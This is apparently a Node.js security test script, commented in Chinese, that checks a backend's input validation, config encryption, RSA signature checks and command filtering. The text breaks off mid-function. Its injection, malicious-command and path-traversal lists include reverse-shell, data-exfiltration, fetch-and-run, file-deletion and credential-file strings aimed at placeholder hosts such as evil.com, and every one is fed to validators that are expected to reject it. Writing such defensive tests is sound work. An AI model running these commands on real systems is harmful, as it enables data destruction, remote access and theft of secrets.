#!/usr/bin/env node

/**
 * 安全功能测试脚本 - Security Test Suite
 * 
 * ## 目标与范围
 * - 目标：全面测试新安全模型是否引入了安全漏洞，确保系统安全防线
 * - 范围：用户验证、配置加密、签名验证、测试监控等安全功能
 * 
 * ## 核心原则
 * - 系统性思维：从威胁建模到安全测试的全流程覆盖
 * - 质量第一：确保安全功能的真实性和可靠性
 * - 安全边界：严格的输入验证和输出过滤
 * - 持续改进：结构化报告便于后续安全优化
 * 
 * @author 后端开发团队
 * @version 2.0.0
 * @since 2025-10-13
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');

// ==================== 模块导入 ====================

// 导入安全模块
const { validateTestRun, provideSecurityRecommendations, checkEnvironmentIsolation, assessTestImpact, logTestActivity } = require('./redesigned-user-validation.js');
const { readConfigFile, isConfigFileEncrypted, encryptData, decryptData, generateKey } = require('./config-encryption.js');
const { Signer, Verifier } = require('./signature-service/index.js');
const { UnifiedTestMonitor } = require('../test-monitor.cjs');

// ==================== 配置管理 ====================

/**
 * CLI 选项解析与默认输出目录
 */
function parseArgs(argv) {
  const args = argv.slice(2);
  const opts = { 
    help: false, 
    json: false, 
    outDir: null, 
    debug: false,
    strict: false,
    verbose: false
  };
  
  for (const a of args) {
    if (a === '--help' || a === '-h') opts.help = true;
    else if (a === '--json') opts.json = true;
    else if (a === '--debug') opts.debug = true;
    else if (a === '--strict') opts.strict = true;
    else if (a === '--verbose' || a === '-v') opts.verbose = true;
    else if (a.startsWith('--outDir=')) opts.outDir = a.split('=')[1];
  }
  return opts;
}

/**
 * 显示帮助信息
 */
function printHelp() {
  console.log(`
🔒 安全功能测试脚本 v2.0.0

用法：
  node backend/scripts/security/security-test.cjs [选项]

选项：
  --json          启用终端摘要 JSON 落盘（与 AI_DEV_PROMPT_GUIDE.md 对齐）
  --debug         在终端摘要中写入调试扩展字段
  --strict        严格模式：任何测试失败都导致非零退出码
  --verbose, -v   详细输出模式
  --outDir=PATH   指定输出目录（默认：backend/test-output）
  --help, -h      显示此帮助

示例：
  node backend/scripts/security/security-test.cjs --strict --json
  node backend/scripts/security/security-test.cjs --verbose --outDir=./security-reports
`);
}

const DEFAULT_OUT_DIR = path.join(__dirname, '..', '..', 'test-output');

// ==================== 工具函数 ====================

/**
 * 确保目录存在
 */
function ensureDir(dirPath) {
  try {
    fs.mkdirSync(dirPath, { recursive: true });
  } catch (error) {
    console.error(`创建目录失败: ${dirPath}`, error.message);
    throw error;
  }
}

/**
 * 构建环境快照
 */
function buildEnvSnapshot() {
  return {
    IDLE_TIMEOUT_MS: process.env.IDLE_TIMEOUT_MS || null,
    CMD_TIMEOUT_MS: process.env.CMD_TIMEOUT_MS || null,
    NODE_ENV: process.env.NODE_ENV || null,
    SECURITY_LEVEL: process.env.SECURITY_LEVEL || 'standard'
  };
}

/**
 * 构建上下文快照
 */
function buildContextSnapshot() {
  return {
    cwd: process.cwd(),
    os: os.platform(),
    node: process.version,
    architecture: os.arch(),
    hostname: os.hostname()
  };
}

// ==================== 测试配置 ====================

/**
 * 测试环境配置
 */
const TEST_CONFIG = {
  testDir: path.join(__dirname, 'test-security'),
  configDir: path.join(__dirname, 'test-security', 'config'),
  keysDir: path.join(__dirname, 'test-security', 'keys'),
  logsDir: path.join(__dirname, 'test-security', 'logs'),
  testConfigFile: path.join(__dirname, 'test-security', 'config', 'test-config.json'),
  encryptedConfigFile: path.join(__dirname, 'test-security', 'config', 'test-config.encrypted.json'),
  publicKeyFile: path.join(__dirname, 'test-security', 'keys', 'public.pem'),
  privateKeyFile: path.join(__dirname, 'test-security', 'keys', 'private.pem'),
  signatureFile: path.join(__dirname, 'test-security', 'config', 'test-config.json.sig')
};

// ==================== 测试结果管理 ====================

/**
 * 测试结果管理器
 */
class TestResultManager {
  constructor() {
    this.results = {
      total: 0,
      passed: 0,
      failed: 0,
      warnings: 0,
      details: [],
      startTime: new Date().toISOString(),
      endTime: null
    };
    this.securityRecommendations = [];
  }

  /**
   * 记录测试结果
   */
  recordTestResult(testName, passed, message, severity = 'info') {
    const result = {
      name: testName,
      passed,
      message,
      severity,
      timestamp: new Date().toISOString(),
      duration: null
    };
    
    this.results.details.push(result);
    this.results.total++;
    
    if (passed) {
      this.results.passed++;
      console.log(`✅ [${testName}] ${message}`);
    } else {
      this.results.failed++;
      console.log(`❌ [${testName}] ${message}`);
    }
    
    return result;
  }

  /**
   * 记录警告
   */
  recordWarning(testName, message) {
    this.results.warnings++;
    console.log(`⚠️ [${testName}] ${message}`);
    
    const warning = {
      name: testName,
      type: 'warning',
      message,
      timestamp: new Date().toISOString()
    };
    
    this.results.details.push(warning);
    return warning;
  }

  /**
   * 添加安全建议
   */
  addSecurityRecommendation(recommendation) {
    this.securityRecommendations.push({
      ...recommendation,
      timestamp: new Date().toISOString(),
      id: crypto.randomBytes(8).toString('hex')
    });
  }

  /**
   * 完成测试
   */
  complete() {
    this.results.endTime = new Date().toISOString();
    this.results.duration = Date.now() - new Date(this.results.startTime).getTime();
    this.results.passRate = ((this.results.passed / this.results.total) * 100).toFixed(2) + '%';
    
    return this.results;
  }
}

// 全局测试结果管理器
const testManager = new TestResultManager();

// ==================== 测试环境管理 ====================

/**
 * 准备测试环境
 */
function setupTestEnvironment() {
  try {
    console.log('🛠️ 准备测试环境...');
    
    // 创建测试目录结构
    const directories = [
      TEST_CONFIG.testDir,
      TEST_CONFIG.configDir,
      TEST_CONFIG.keysDir,
      TEST_CONFIG.logsDir
    ];
    
    directories.forEach(dir => {
      if (!fs.existsSync(dir)) {
        ensureDir(dir);
      }
    });
    
    // 创建测试配置文件
    const testConfig = {
      testCommand: process.platform === 'win32' ? 'cmd /c echo "test"' : 'echo "test"',
      coverageFile: path.join(TEST_CONFIG.testDir, 'coverage.json'),
      targetCoverage: 80,
      logLevel: 'INFO',
      security: {
        enabled: true,
        level: 'high'
      }
    };
    
    fs.writeFileSync(TEST_CONFIG.testConfigFile, JSON.stringify(testConfig, null, 2));
    
    console.log('✅ 测试环境准备完成');
    return true;
  } catch (error) {
    console.error(`❌ 测试环境设置失败: ${error.message}`);
    return false;
  }
}

/**
 * 清理测试环境
 */
function cleanupTestEnvironment() {
  try {
    console.log('🧹 清理测试环境...');
    
    if (fs.existsSync(TEST_CONFIG.testDir)) {
      fs.rmSync(TEST_CONFIG.testDir, { recursive: true, force: true });
    }
    
    console.log('✅ 测试环境清理完成');
    return true;
  } catch (error) {
    console.error(`⚠️ 测试环境清理失败: ${error.message}`);
    return false;
  }
}

// ==================== 安全测试模块 ====================

/**
 * 用户验证安全性测试
 */
function testUserValidationSecurity() {
  console.log('\n🔐 测试用户验证安全性');
  
  let allTestsPassed = true;
  
  try {
    // 测试1: 系统级测试的风险评估
    const systemTestConfig = {
      type: 'system',
      name: '系统级测试',
      description: '测试系统级测试的风险评估',
      showRecommendations: false
    };
    
    const systemResult = validateTestRun(systemTestConfig);
    const hasHighRiskRecommendation = systemResult.recommendations.some(rec =>
      rec.type === 'test' && rec.priority === 'high'
    );
    
    const test1Passed = testManager.recordTestResult('系统级测试风险评估', hasHighRiskRecommendation,
      hasHighRiskRecommendation ? '系统级测试高风险被正确识别（安全）' : '系统级测试风险评估未识别风险（安全风险）', 'high');
    allTestsPassed = allTestsPassed && test1Passed;
    
    // 收集安全建议
    if (systemResult.recommendations && systemResult.recommendations.length > 0) {
      systemResult.recommendations.forEach(rec => testManager.addSecurityRecommendation(rec));
    }
    
    // 测试2: 注入攻击用户名检测
    const injectionUsernames = [
      'admin; rm -rf /',
      '../../etc/passwd',
      'user|nc attacker.com 4444',
      '${jndi:ldap://evil.com/a}',
      'user\u0000admin',
      '`whoami`', // 命令替换
      '$(cat /etc/passwd)', // 命令替换
      'user && curl evil.com', // 命令连接
      'test || rm -rf /', // 命令连接
    ];
    
    let allInjectionRejected = true;
    let detectedPatterns = [];
    
    for (const username of injectionUsernames) {
      try {
        const mockUser = {
          username: username,
          uid: 1000,
          gid: 1000,
          homedir: '/home/test',
          shell: '/bin/bash'
        };
        
        const originalOsUserInfo = os.userInfo;
        os.userInfo = () => mockUser;
        
        try {
          const injectionConfig = {
            type: 'integration',
            name: '注入攻击测试',
            description: '测试包含注入攻击的用户名',
            showRecommendations: false
          };
         
          const result = validateTestRun(injectionConfig, mockUser);
          if (result.valid) {
            allInjectionRejected = false;
            detectedPatterns.push(username);
          }
         
          if (result.recommendations && result.recommendations.length > 0) {
            result.recommendations.forEach(rec => testManager.addSecurityRecommendation(rec));
          }
        } finally {
          os.userInfo = originalOsUserInfo;
        }
      } catch (error) {
        allInjectionRejected = false;
        detectedPatterns.push(`${username} (异常: ${error.message})`);
      }
    }
    
    const test2Passed = testManager.recordTestResult('注入攻击用户名验证', allInjectionRejected,
      allInjectionRejected ? '所有包含注入攻击的用户名被拒绝（安全）' : `包含注入攻击的用户名被接受: ${detectedPatterns.join(', ')}`, 'critical');
    allTestsPassed = allTestsPassed && test2Passed;
    
    // 测试3: 测试配置边界值
    const boundaryConfigs = [
      { type: undefined }, // 未定义类型
      { type: null }, // null类型
      { type: '' }, // 空字符串类型
      { type: 'invalid_type' }, // 无效类型
      { type: 'read-only' }, // 只读类型
      { type: 'integration' }, // 集成类型
      { type: 'system' }, // 系统类型
    ];
    
    let boundaryTestsPassed = 0;
    for (const config of boundaryConfigs) {
      try {
        const result = validateTestRun(config);
        // 所有边界情况都应该处理而不崩溃
        boundaryTestsPassed++;
      } catch (error) {
        testManager.recordWarning('边界值测试', `配置 ${JSON.stringify(config)} 导致异常: ${error.message}`);
      }
    }
    
    const test3Passed = testManager.recordTestResult('配置边界值测试', boundaryTestsPassed === boundaryConfigs.length,
      `处理边界值: ${boundaryTestsPassed}/${boundaryConfigs.length}`, 'medium');
    allTestsPassed = allTestsPassed && test3Passed;
    
    // 测试4: 测试用户信息边界值
    const boundaryUsers = [
      { username: '', uid: -1, gid: -1 }, // 空用户名
      { username: 'a'.repeat(1000), uid: 0, gid: 0 }, // 超长用户名
      { username: '\x00\x01\x02', uid: 1000, gid: 1000 }, // 特殊字符用户名
      { username: '正常用户', uid: Number.MAX_SAFE_INTEGER, gid: Number.MAX_SAFE_INTEGER }, // 大数值UID/GID
      { username: 'normal', uid: Number.MIN_SAFE_INTEGER, gid: Number.MIN_SAFE_INTEGER }, // 小数值UID/GID
    ];
    
    let userBoundaryTestsPassed = 0;
    for (const mockUser of boundaryUsers) {
      try {
        const originalOsUserInfo = os.userInfo;
        os.userInfo = () => mockUser;
        
        try {
          const result = validateTestRun({ type: 'integration' }, mockUser);
          // 所有边界情况都应该处理而不崩溃
          userBoundaryTestsPassed++;
        } finally {
          os.userInfo = originalOsUserInfo;
        }
      } catch (error) {
        testManager.recordWarning('用户边界值测试', `用户 ${mockUser.username} 导致异常: ${error.message}`);
      }
    }
    
    const test4Passed = testManager.recordTestResult('用户边界值测试', userBoundaryTestsPassed === boundaryUsers.length,
      `处理用户边界值: ${userBoundaryTestsPassed}/${boundaryUsers.length}`, 'medium');
    allTestsPassed = allTestsPassed && test4Passed;
    
    // 测试5: 测试建议收集功能
    const collectConfig = {
      type: 'system',
      name: '建议收集测试',
      description: '测试建议收集功能',
      collectRecommendations: true,
      showRecommendations: false
    };
    
    const collectResult = validateTestRun(collectConfig);
    const hasCollectedRecommendations = collectResult.collectedRecommendations &&
                                      collectResult.collectedRecommendations.length > 0;
    
    const test5Passed = testManager.recordTestResult('建议收集功能测试', hasCollectedRecommendations,
      hasCollectedRecommendations ? '建议收集功能正常（安全）' : '建议收集功能异常（安全风险）', 'medium');
    allTestsPassed = allTestsPassed && test5Passed;
    
    return allTestsPassed;
  } catch (error) {
    testManager.recordTestResult('用户验证安全性', false, `错误: ${error.message}`, 'high');
    return false;
  }
}

/**
 * 配置文件加密安全性测试
 */
function testConfigEncryptionSecurity() {
  console.log('\n🔒 测试配置文件加密安全性');
  
  let allTestsPassed = true;
  
  try {
    const { encryptData, decryptData, generateKey } = require('./config-encryption');
    
    // 测试1: 弱密码加密
    const weakPasswords = ['123456', 'password', 'admin', 'qwerty', '111111', '', '123', 'abc'];
    
    let allWeakPasswordsWork = true;
    let failedPasswords = [];
    
    for (const password of weakPasswords) {
      try {
        const key = generateKey();
        const testData = { sensitive: 'data', timestamp: Date.now() };
        const encrypted = encryptData(testData, key, password);
        const decrypted = decryptData(encrypted, key, password);
        
        if (JSON.stringify(decrypted) !== JSON.stringify(testData)) {
          allWeakPasswordsWork = false;
          failedPasswords.push(password);
        }
      } catch (error) {
        allWeakPasswordsWork = false;
        failedPasswords.push(`${password} (${error.message})`);
      }
    }
    
    const test1Passed = testManager.recordTestResult('弱密码加密', allWeakPasswordsWork,
      allWeakPasswordsWork ? '弱密码可以加密（建议加强密码策略）' : `弱密码加密失败: ${failedPasswords.join(', ')}`, 'medium');
    allTestsPassed = allTestsPassed && test1Passed;
    
    // 测试2: 加密数据完整性
    const key = generateKey();
    const testData = { sensitive: 'data', timestamp: Date.now() };
    const encrypted = encryptData(testData, key);
    
    // 篡改加密数据 - 多种篡改方式
    const tamperingMethods = [
      { name: '修改第一个字节', modify: (data) => { data[0] = data[0] ^ 0xFF; } },
      { name: '修改中间字节', modify: (data) => { data[Math.floor(data.length/2)] = data[Math.floor(data.length/2)] ^ 0xFF; } },
      { name: '修改最后一个字节', modify: (data) => { data[data.length-1] = data[data.length-1] ^ 0xFF; } },
      { name: '删除第一个字节', modify: (data) => data.slice(1) },
      { name: '添加随机字节', modify: (data) => Buffer.concat([data, Buffer.from([0xFF])]) },
    ];
    
    let allTamperingDetected = true;
    let failedTampering = [];
    
    for (const method of tamperingMethods) {
      try {
        const tamperedData = { ...encrypted };
        const encryptedData = Buffer.from(tamperedData.data, 'base64');
        method.modify(encryptedData);
        tamperedData.data = encryptedData.toString('base64');
        
        let tamperingDetected = false;
        try {
          decryptData(tamperedData, key);
        } catch (error) {
          tamperingDetected = true;
        }
        
        if (!tamperingDetected) {
          allTamperingDetected = false;
          failedTampering.push(method.name);
        }
      } catch (error) {
        allTamperingDetected = false;
        failedTampering.push(`${method.name} (${error.message})`);
      }
    }
    
    const test2Passed = testManager.recordTestResult('加密数据完整性', allTamperingDetected,
      allTamperingDetected ? '所有篡改数据被检测到（安全）' : `篡改未被检测到: ${failedTampering.join(', ')}`, 'high');
    allTestsPassed = allTestsPassed && test2Passed;
    
    // 测试3: 大数据加密
    const largeDataSizes = [1024, 10240, 102400, 1024000]; // 1KB, 10KB, 100KB, 1MB
    let largeDataTestsPassed = 0;
    let failedLargeDataSizes = [];
    
    for (const size of largeDataSizes) {
      try {
        const largeData = {
          data: 'x'.repeat(size),
          timestamp: Date.now(),
          metadata: { size, type: 'test' }
        };
        
        const encrypted = encryptData(largeData, key);
        const decrypted = decryptData(encrypted, key);
        
        if (JSON.stringify(decrypted) === JSON.stringify(largeData)) {
          largeDataTestsPassed++;
        } else {
          failedLargeDataSizes.push(`${size}B (数据不匹配)`);
        }
      } catch (error) {
        failedLargeDataSizes.push(`${size}B (${error.message})`);
      }
    }
    
    const test3Passed = testManager.recordTestResult('大数据加密测试', largeDataTestsPassed === largeDataSizes.length,
      `大数据加密: ${largeDataTestsPassed}/${largeDataSizes.length}`, 'medium');
    allTestsPassed = allTestsPassed && test3Passed;
    
    // 测试4: 特殊字符数据加密
    const specialCharData = [
      { name: 'Unicode字符', data: { text: '测试数据🚀🔒💻', emoji: '😀😁😂' } },
      { name: '控制字符', data: { text: '前\x00后\x01中\x02间' } },
      { name: '引号字符', data: { text: '"单引号\'和"双引号"' } },
      { name: '换行字符', data: { text: '第一行\n第二行\r\n第三行' } },
      { name: 'JSON特殊字符', data: { text: '{}[]/:;@&?=+$,#' } },
    ];
    
    let specialCharTestsPassed = 0;
    let failedSpecialChars = [];
    
    for (const test of specialCharData) {
      try {
        const encrypted = encryptData(test.data, key);
        const decrypted = decryptData(encrypted, key);
        
        if (JSON.stringify(decrypted) === JSON.stringify(test.data)) {
          specialCharTestsPassed++;
        } else {
          failedSpecialChars.push(test.name);
        }
      } catch (error) {
        failedSpecialChars.push(`${test.name} (${error.message})`);
      }
    }
    
    const test4Passed = testManager.recordTestResult('特殊字符数据加密', specialCharTestsPassed === specialCharData.length,
      `特殊字符加密: ${specialCharTestsPassed}/${specialCharData.length}`, 'medium');
    allTestsPassed = allTestsPassed && test4Passed;
    
    // 测试5: 错误密钥解密
    const wrongKeys = [
      generateKey(), // 不同的有效密钥
      'invalid-key', // 字符串密钥
      null, // null密钥
      undefined, // undefined密钥
      {}, // 空对象密钥
      12345, // 数字密钥
    ];
    
    let wrongKeyTestsPassed = 0;
    let failedWrongKeys = [];
    
    for (const wrongKey of wrongKeys) {
      try {
        decryptData(encrypted, wrongKey);
        failedWrongKeys.push(`密钥类型: ${typeof wrongKey}`);
      } catch (error) {
        // 预期会抛出错误
        wrongKeyTestsPassed++;
      }
    }
    
    const test5Passed = testManager.recordTestResult('错误密钥解密测试', wrongKeyTestsPassed === wrongKeys.length,
      `错误密钥拒绝: ${wrongKeyTestsPassed}/${wrongKeys.length}`, 'high');
    allTestsPassed = allTestsPassed && test5Passed;
    
    return allTestsPassed;
  } catch (error) {
    testManager.recordTestResult('配置文件加密安全性', false, `错误: ${error.message}`, 'high');
    return false;
  }
}

/**
 * 签名验证安全性测试
 */
async function testSignatureVerificationSecurity() {
  console.log('\n📝 测试签名验证安全性');
  
  let allTestsPassed = true;
  
  try {
    // 测试1: 正常签名验证
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    
    // 保存密钥对
    fs.writeFileSync(TEST_CONFIG.publicKeyFile, publicKey);
    fs.writeFileSync(TEST_CONFIG.privateKeyFile, privateKey);
    
    // 签名配置文件
    const configData = fs.readFileSync(TEST_CONFIG.testConfigFile, 'utf8');
    const sign = crypto.createSign('RSA-SHA256');
    sign.update(configData);
    const signature = sign.sign(privateKey, 'hex');
    fs.writeFileSync(TEST_CONFIG.signatureFile, signature, 'utf8');
    
    // 验证签名
    const verify = crypto.createVerify('RSA-SHA256');
    verify.update(configData);
    const isValid = verify.verify(publicKey, signature, 'hex');
    
    const test1Passed = testManager.recordTestResult('正常签名验证', isValid,
      isValid ? '正常签名验证通过（安全）' : '正常签名验证失败（异常）', 'high');
    allTestsPassed = allTestsPassed && test1Passed;
    
    // 测试2: 修改配置文件后验证签名
    const modifiedConfig = JSON.parse(configData);
    modifiedConfig.testCommand = 'echo "modified"';
    fs.writeFileSync(TEST_CONFIG.testConfigFile, JSON.stringify(modifiedConfig, null, 2));
    
    const modifiedConfigData = fs.readFileSync(TEST_CONFIG.testConfigFile, 'utf8');
    const verifyModified = crypto.createVerify('RSA-SHA256');
    verifyModified.update(modifiedConfigData);
    const isModifiedValid = verifyModified.verify(publicKey, signature, 'hex');
    
    const test2Passed = testManager.recordTestResult('修改后签名验证', !isModifiedValid,
      !isModifiedValid ? '修改后签名验证失败（安全）' : '修改后签名验证通过（安全风险）', 'critical');
    allTestsPassed = allTestsPassed && test2Passed;
    
    // 测试3: 篡改签名文件
    const tamperedSignature = signature.slice(0, -1) + (signature.slice(-1) === 'a' ? 'b' : 'a');
    fs.writeFileSync(TEST_CONFIG.signatureFile, tamperedSignature, 'utf8');
    
    const verifyTampered = crypto.createVerify('RSA-SHA256');
    verifyTampered.update(configData);
    const isTamperedValid = verifyTampered.verify(publicKey, tamperedSignature, 'hex');
    
    const test3Passed = testManager.recordTestResult('篡改签名验证', !isTamperedValid,
      !isTamperedValid ? '篡改签名验证失败（安全）' : '篡改签名验证通过（安全风险）', 'critical');
    allTestsPassed = allTestsPassed && test3Passed;
    
    // 恢复正确签名
    fs.writeFileSync(TEST_CONFIG.signatureFile, signature, 'utf8');
    
    // 测试4: 不同密钥长度签名验证
    const keyLengths = [1024, 2048, 4096];
    let keyLengthTestsPassed = 0;
    let failedKeyLengths = [];
    
    for (const length of keyLengths) {
      try {
        const { publicKey: pubKey, privateKey: privKey } = crypto.generateKeyPairSync('rsa', {
          modulusLength: length,
          publicKeyEncoding: { type: 'spki', format: 'pem' },
          privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
        });
        
        const testSign = crypto.createSign('RSA-SHA256');
        testSign.update(configData);
        const testSignature = testSign.sign(privKey, 'hex');
        
        const testVerify = crypto.createVerify('RSA-SHA256');
        testVerify.update(configData);
        const isValid = testVerify.verify(pubKey, testSignature, 'hex');
        
        if (isValid) {
          keyLengthTestsPassed++;
        } else {
          failedKeyLengths.push(`${length}位`);
        }
      } catch (error) {
        failedKeyLengths.push(`${length}位 (${error.message})`);
      }
    }
    
    const test4Passed = testManager.recordTestResult('不同密钥长度签名验证', keyLengthTestsPassed === keyLengths.length,
      `密钥长度测试: ${keyLengthTestsPassed}/${keyLengths.length}`, 'medium');
    allTestsPassed = allTestsPassed && test4Passed;
    
    // 测试5: 不同哈希算法签名验证
    const hashAlgorithms = ['sha1', 'sha256', 'sha512'];
    let hashAlgorithmTestsPassed = 0;
    let failedHashAlgorithms = [];
    
    for (const algo of hashAlgorithms) {
      try {
        const testSign = crypto.createSign(`${algo.toUpperCase()}`);
        testSign.update(configData);
        const testSignature = testSign.sign(privateKey, 'hex');
        
        const testVerify = crypto.createVerify(`${algo.toUpperCase()}`);
        testVerify.update(configData);
        const isValid = testVerify.verify(publicKey, testSignature, 'hex');
        
        if (isValid) {
          hashAlgorithmTestsPassed++;
        } else {
          failedHashAlgorithms.push(algo);
        }
      } catch (error) {
        failedHashAlgorithms.push(`${algo} (${error.message})`);
      }
    }
    
    const test5Passed = testManager.recordTestResult('不同哈希算法签名验证', hashAlgorithmTestsPassed === hashAlgorithms.length,
      `哈希算法测试: ${hashAlgorithmTestsPassed}/${hashAlgorithms.length}`, 'medium');
    allTestsPassed = allTestsPassed && test5Passed;
    
    // 测试6: 大文件签名验证
    const largeFileSizes = [10240, 102400, 1024000]; // 10KB, 100KB, 1MB
    let largeFileTestsPassed = 0;
    let failedLargeFiles = [];
    
    for (const size of largeFileSizes) {
      try {
        const largeData = 'x'.repeat(size);
        const testSign = crypto.createSign('RSA-SHA256');
        testSign.update(largeData);
        const testSignature = testSign.sign(privateKey, 'hex');
        
        const testVerify = crypto.createVerify('RSA-SHA256');
        testVerify.update(largeData);
        const isValid = testVerify.verify(publicKey, testSignature, 'hex');
        
        if (isValid) {
          largeFileTestsPassed++;
        } else {
          failedLargeFiles.push(`${size}字节`);
        }
      } catch (error) {
        failedLargeFiles.push(`${size}字节 (${error.message})`);
      }
    }
    
    const test6Passed = testManager.recordTestResult('大文件签名验证', largeFileTestsPassed === largeFileSizes.length,
      `大文件签名测试: ${largeFileTestsPassed}/${largeFileSizes.length}`, 'medium');
    allTestsPassed = allTestsPassed && test6Passed;
    
    // 恢复原始配置文件
    modifiedConfig.testCommand = process.platform === 'win32' ? 'cmd /c echo "test"' : 'echo "test"';
    fs.writeFileSync(TEST_CONFIG.testConfigFile, JSON.stringify(modifiedConfig, null, 2));
    
    return allTestsPassed;
  } catch (error) {
    testManager.recordTestResult('签名验证安全性', false, `错误: ${error.message}`, 'high');
    return false;
  }
}

/**
 * Test Monitor安全性测试
 */
function testTestMonitorSecurity() {
  console.log('\n🛡️ 测试Test Monitor安全性');
  
  let allTestsPassed = true;
  
  try {
    // 测试1: 恶意命令过滤
    const maliciousCommands = [
      'rm -rf /',
      'del /f /s /q C:\\*.*',
      '; cat /etc/passwd',
      '&& format c:',
      '| nc attacker.com 4444 -e /bin/sh',
      'powershell -Command "Invoke-Expression"',
      'curl -X POST -d @/etc/passwd http://evil.com',
      'wget -qO- http://evil.com/script.sh | bash',
      'eval $(curl http://evil.com)',
      '`curl http://evil.com/script.sh`',
      '$(curl http://evil.com/script.sh)',
      'sudo su -',
      'su root',
      'chmod 777 /etc/shadow',
      'chown root:root /etc/passwd'
    ];
    
    let allMaliciousCommandsRejected = true;
    let acceptedCommands = [];
    
    for (const command of maliciousCommands) {
      try {
        const monitorConfig = {
          testCommand: command,
          configFile: TEST_CONFIG.testConfigFile,
          logLevel: 'ERROR',
          features: { security: { enabled: true } },
          security: { commandWhitelist: ['echo', 'cmd'] }
        };
        
        const monitor = new UnifiedTestMonitor(monitorConfig);
        allMaliciousCommandsRejected = false;
        acceptedCommands.push(command);
      } catch (error) {
        // 预期会抛出错误
      }
    }
    
    const test1Passed = testManager.recordTestResult('恶意命令过滤', allMaliciousCommandsRejected,
      allMaliciousCommandsRejected ? '所有恶意命令被拒绝（安全）' : `恶意命令被接受: ${acceptedCommands.join(', ')}`, 'critical');
    allTestsPassed = allTestsPassed && test1Passed;
    
    // 测试2: 路径遍历防护
    const pathTraversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\config\\SAM',
      '../../../root/.ssh/id_rsa',
      '..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa',
      '....//....//....//etc/passwd', // 编码路径遍历
      '..%2f..%2f..%2fetc%2fpasswd', // URL编码路径遍历
      '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam', // URL编码Windows路径遍历
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // 双重URL编码路径遍历
      '..%252f..%252f..%252fetc%252fpasswd', // 三重URL编码路径遍历
      '/var/www/../../etc/passwd',
      'C:\\inetpub\\wwwroot\\..\\..\\..\\windows\\system32\\config\\SAM'
    ];
    
    let allPathTraversalRejected = true;
    let acceptedPaths = [];
    
    for (const path of pathTraversalAttempts) {
      try {
        const monitor = new UnifiedTestMonitor({
          testCommand: 'echo "test"',
          configFile: TEST_CONFIG.testConfigFile,
          features: { security: { enabled: true } },
          security: { allowedPaths: [__dirname] }
        });
        
        monitor.validatePath(path);
        allPathTraversalRejected = false;
        acceptedPaths.push(path);
      } catch (error) {
        // 预期会抛出错误
      }
    }
    
    const test2Passed = testManager.recordTestResult('路径遍历防护', allPathTraversalRejected,
      allPathTraversalRejected ? '所有路径遍历被拒绝（安全）' : `路径遍历被接受: ${acceptedPaths.join(', ')}`, 'high');
    allTestsPassed = allTestsPassed && test2Passed;
    
    // 测试3: 配置文件篡改检测
    try {
      // 读取原始配置
      const originalConfig = JSON.parse(fs.readFileSync(TEST_CONFIG.testConfigFile, 'utf8'));
      
      // 篡改配置
      originalConfig.testCommand = 'malicious_command';
      fs.writeFileSync(TEST_CONFIG.testConfigFile, JSON.stringify(originalConfig, null, 2));
      
      // 尝试使用篡改后的配置创建监控器
      let tamperingDetected = false;
      try {
        const monitor = new UnifiedTestMonitor({
          testCommand: 'echo "test"',
          configFile: TEST_CONFIG.testConfigFile,
          security: { enableSignatureVerification: true }
        });
      } catch (error) {
        if (error.message.includes('signature') || error.message.includes('verification')) {
          tamperingDetected = true;
        }
      }
      
      // 恢复原始配置
      originalConfig.testCommand = process.platform === 'win32' ? 'cmd /c echo "test"' : 'echo "test"';
      fs.writeFileSync(TEST_CONFIG.testConfigFile, JSON.stringify(originalConfig, null, 2));
      
      const test3Passed = testManager.recordTestResult('配置文件篡改检测', tamperingDetected,
        tamperingDetected ? '配置文件篡改被检测到（安全）' : '配置文件篡改未被检测到（安全风险）', 'high');
      allTestsPassed = allTestsPassed && test3Passed;
    } catch (error) {
      testManager.recordTestResult('配置文件篡改检测', false, `错误: ${error.message}`, 'high');
      allTestsPassed = false;
    }
    
    // 测试4: 日志脱敏功能
    try {
      const sensitiveData = {
        password: 'secret123',
        apiKey: 'sk-1234567890abcdef',
        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        creditCard: '4111-1111-1111-1111',
        email: 'user@example.com',
        phone: '+1-555-123-4567'
      };
      
      // 创建一个包含敏感信息的日志条目
      const logEntry = {
        message: `User login with password: ${sensitiveData.password}, apiKey: ${sensitiveData.apiKey}`,
        level: 'INFO',
        timestamp: new Date().toISOString()
      };
      
      // 检查日志是否被正确脱敏
      const logString = JSON.stringify(logEntry);
      const containsSensitiveInfo =
        logString.includes(sensitiveData.password) ||
        logString.includes(sensitiveData.apiKey) ||
        logString.includes(sensitiveData.token) ||
        logString.includes(sensitiveData.creditCard);
      
      const test4Passed = testManager.recordTestResult('日志脱敏功能', !containsSensitiveInfo,
        !containsSensitiveInfo ? '敏感信息已正确脱敏（安全）' : '敏感信息未脱敏（安全风险）', 'medium');
      allTestsPassed = allTestsPassed && test4Passed;
    } catch (error) {
      testManager.recordTestResult('日志脱敏功能', false, `错误: ${error.message}`, 'high');
      allTestsPassed = false;
    }
    
    // 测试5: 文件权限检查
    try {
      const testFilePath = path.join(TEST_CONFIG.testDir, 'test-permissions.txt');
      fs.writeFileSync(testFilePath, 'test content');
      
      // 测试不安全的文件权限
      if (process.platform !== 'win32') {
        fs.chmodSync(testFilePath, 0o777); // 所有人都有读写执行权限
        
        let insecurePermissionsDetected = false;
        try {
          const monitor = new UnifiedTestMonitor({
            testCommand: 'echo "test"',
            security: {
              filePermissions: {
                log: 0o600,
                report: 0o644,
                lock: 0o600
              }
            }
          });
          
          // 检查文件权限
          const stats = fs.statSync(testFilePath);
          const mode = stats.mode;
          
          // 检查是否对其他用户可写
          if ((mode & 0o002) || (mode & 0o020)) {
            insecurePermissionsDetected = true;
          }
        } catch (error) {
          testManager.recordWarning('文件权限检查', `权限检查异常: ${error.message}`);
        }
        
        const test5Passed = testManager.recordTestResult('文件权限检查', insecurePermissionsDetected,
          insecurePermissionsDetected ? '不安全的文件权限被检测到（安全）' : '不安全的文件权限未被检测到（安全风险）', 'medium');
        allTestsPassed = allTestsPassed && test5Passed;
        
        // 清理测试文件
